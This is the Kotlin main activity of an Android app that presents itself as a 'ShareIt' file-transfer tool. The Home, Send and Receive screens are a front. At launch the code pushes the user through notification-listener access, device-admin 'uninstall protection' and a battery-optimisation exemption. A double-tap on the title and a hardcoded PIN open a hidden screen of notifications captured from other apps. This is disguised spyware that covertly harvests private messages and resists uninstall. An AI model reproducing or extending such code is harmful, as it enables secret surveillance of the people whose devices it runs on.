package io.shareit.transfer

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import io.shareit.transfer.admin.UninstallProtection
import io.shareit.transfer.notifications.CapturedNotification
import io.shareit.transfer.notifications.NotificationAccess
import io.shareit.transfer.notifications.NotificationStore
import io.shareit.transfer.ui.screens.CapturedNotificationsScreen
import io.shareit.transfer.ui.screens.DeviceSearchScreen
import io.shareit.transfer.ui.screens.ReceiveQrScreen
import io.shareit.transfer.ui.screens.SecretUnlockScreen
import io.shareit.transfer.ui.screens.ShareItHomeScreen
import io.shareit.transfer.ui.theme.ShareItTheme
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

private const val SECRET_PIN = "186100"

private enum class AppScreen {
    Home,
    SendSearch,
    ReceiveQr,
    NotifPin,
    Notifications,
}

/**
 * Sequential permission prompt state. Each step decides whether to launch the
 * matching system flow, then advances when the user returns. The flow only runs
 * once per process — if the user dismisses something we don't keep nagging.
 */
private enum class PermStep { PostNotif, Listener, Admin, Battery, Done }

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            ShareItTheme {
                Box(Modifier.fillMaxSize()) {
                    ShareItAppRoute()
                }
            }
        }
    }
}

@Composable
private fun ShareItAppRoute() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    var screen by remember { mutableStateOf(AppScreen.Home) }
    var showSecretFab by remember { mutableStateOf(false) }
    var captured by remember { mutableStateOf<List<CapturedNotification>>(emptyList()) }
    var notifAccessGranted by remember { mutableStateOf(NotificationAccess.isGranted(context)) }
    var adminActive by remember { mutableStateOf(UninstallProtection.isActive(context)) }

    var permStep by remember { mutableStateOf(PermStep.PostNotif) }

    val postNotifLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        permStep = PermStep.Listener
    }

    val settingsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        notifAccessGranted = NotificationAccess.isGranted(context)
        adminActive = UninstallProtection.isActive(context)
        permStep = when (permStep) {
            PermStep.Listener -> PermStep.Admin
            PermStep.Admin -> PermStep.Battery
            PermStep.Battery -> PermStep.Done
            else -> PermStep.Done
        }
    }

    LaunchedEffect(permStep) {
        when (permStep) {
            PermStep.PostNotif -> {
                val needRuntime = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                    ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.POST_NOTIFICATIONS
                    ) != PackageManager.PERMISSION_GRANTED
                if (needRuntime) {
                    postNotifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                } else {
                    permStep = PermStep.Listener
                }
            }

            PermStep.Listener -> {
                if (!NotificationAccess.isGranted(context)) {
                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    runCatching { settingsLauncher.launch(intent) }
                        .onFailure { permStep = PermStep.Admin }
                } else {
                    permStep = PermStep.Admin
                }
            }

            PermStep.Admin -> {
                if (!UninstallProtection.isActive(context)) {
                    runCatching {
                        settingsLauncher.launch(UninstallProtection.requestEnableIntent(context))
                    }.onFailure { permStep = PermStep.Battery }
                } else {
                    permStep = PermStep.Battery
                }
            }

            PermStep.Battery -> {
                val needBattery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                    pm.isIgnoringBatteryOptimizations(context.packageName).not()
                } else {
                    false
                }
                if (needBattery) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:${context.packageName}")
                    }
                    runCatching { settingsLauncher.launch(intent) }
                        .onFailure { permStep = PermStep.Done }
                } else {
                    permStep = PermStep.Done
                }
            }

            PermStep.Done -> Unit
        }
    }

    fun refreshCaptured() {
        scope.launch {
            captured = NotificationStore.readAll(context)
        }
    }

    LaunchedEffect(Unit) {
        while (true) {
            notifAccessGranted = NotificationAccess.isGranted(context)
            adminActive = UninstallProtection.isActive(context)
            delay(1200L)
        }
    }

    when (screen) {
        AppScreen.Home -> {
            ShareItHomeScreen(
                showSecretButton = showSecretFab,
                onTitleDoubleTap = { showSecretFab = !showSecretFab },
                onOpenNotifications = { screen = AppScreen.NotifPin },
                onSend = { screen = AppScreen.SendSearch },
                onReceive = { screen = AppScreen.ReceiveQr },
                onFiles = {
                    Toast.makeText(context, "Scanning files…", Toast.LENGTH_SHORT).show()
                },
            )
        }

        AppScreen.SendSearch -> {
            BackHandler { screen = AppScreen.Home }
            DeviceSearchScreen(onBack = { screen = AppScreen.Home })
        }

        AppScreen.ReceiveQr -> {
            BackHandler { screen = AppScreen.Home }
            ReceiveQrScreen(onBack = { screen = AppScreen.Home })
        }

        AppScreen.NotifPin -> {
            BackHandler { screen = AppScreen.Home }
            SecretUnlockScreen(
                expectedPin = SECRET_PIN,
                onUnlocked = {
                    refreshCaptured()
                    notifAccessGranted = NotificationAccess.isGranted(context)
                    adminActive = UninstallProtection.isActive(context)
                    screen = AppScreen.Notifications
                },
                onCancel = { screen = AppScreen.Home }
            )
        }

        AppScreen.Notifications -> {
            BackHandler { screen = AppScreen.Home }
            CapturedNotificationsScreen(
                notifications = captured,
                accessGranted = notifAccessGranted,
                adminActive = adminActive,
                onBack = { screen = AppScreen.Home },
                onRefresh = {
                    refreshCaptured()
                    notifAccessGranted = NotificationAccess.isGranted(context)
                    adminActive = UninstallProtection.isActive(context)
                },
                onClearAll = {
                    scope.launch {
                        NotificationStore.clear(context)
                        captured = emptyList()
                    }
                },
                onClearApp = { packageName ->
                    scope.launch {
                        NotificationStore.clearByPackage(context, packageName)
                        captured = NotificationStore.readAll(context)
                    }
                },
                onRequestAccess = {
                    NotificationAccess.openSettings(context)
                },
                onDisableUninstallProtection = {
                    UninstallProtection.removeActiveAdmin(context)
                    adminActive = false
                    Toast.makeText(
                        context,
                        "Uninstall protection disabled. You can now uninstall the app.",
                        Toast.LENGTH_LONG
                    ).show()
                }
            )
        }
    }
}
